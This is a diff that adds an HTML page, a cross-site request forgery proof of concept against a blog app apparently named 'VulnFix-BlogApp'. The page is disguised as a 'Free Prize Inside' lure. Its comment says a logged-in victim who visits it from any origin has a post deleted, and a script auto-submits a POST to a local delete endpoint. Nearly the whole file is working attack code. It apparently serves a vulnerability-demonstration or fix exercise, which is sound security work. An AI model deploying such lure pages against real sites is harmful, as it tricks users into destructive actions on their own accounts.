@@ -1,0 +1,18 @@
+<!DOCTYPE html>
+<html>
+<head><title>Free Prize Inside</title></head>
+<body>
+  <h1>Loading your prize...</h1>
+  <!--
+    CSRF PoC for VulnFix-BlogApp /post/delete/<id>
+    Host this page on ANY origin. If a logged-in victim visits it,
+    their session cookie is attached automatically (no SameSite/CSRF
+    token check on the delete form) and their post is deleted.
+  -->
+  <form id="csrf-form" action="http://127.0.0.1:5000/post/delete/15" method="POST">
+  </form>
+  <script>
+    document.getElementById('csrf-form').submit();
+  </script>
+</body>
+</html>
